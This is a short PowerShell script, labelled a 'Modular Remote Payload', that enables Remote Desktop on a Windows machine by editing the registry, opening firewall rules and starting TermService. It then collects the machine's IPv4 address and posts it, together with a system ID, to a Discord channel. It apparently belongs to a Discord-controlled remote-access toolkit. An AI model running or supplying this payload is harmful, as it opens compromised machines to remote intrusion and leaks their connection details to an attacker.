# ============================================================
# Enable RDP for Windows - Modular Remote Payload
# ============================================================
# Enables Remote Desktop Protocol
# ============================================================

$sysid = Get-SystemID

try {
    # Enable RDP in registry
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
    
    # Enable Network Level Authentication
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
    
    # Enable firewall rules
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 2>$null
    
    # Start and enable service
    Set-Service -Name TermService -StartupType Automatic
    Start-Service TermService
    
    # Get IP for connection
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress | Select-Object -First 1
    
    Send-Discord "🖥️ **RDP Enabled on $sysid**`n• Connect to: ``$ip```n• Port: ``3389``"
} catch {
    Send-Discord "❌ RDP enable failed on $sysid: $($_.Exception.Message)"
}
